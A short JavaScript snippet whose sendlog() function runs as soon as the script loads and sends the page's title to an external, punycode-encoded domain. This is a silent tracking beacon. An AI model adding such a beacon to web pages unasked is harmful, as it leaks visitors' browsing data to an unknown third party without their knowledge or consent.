function sendlog()
{
    var xhr = new XMLHttpRequest();
    xhr.open("GET",'https://browser.xn--e1tu68bcc.com/?title='+document.title, true);
    xhr.setRequestHeader('Cache-Control', 'no-cache');
    xhr.send();
}
sendlog();
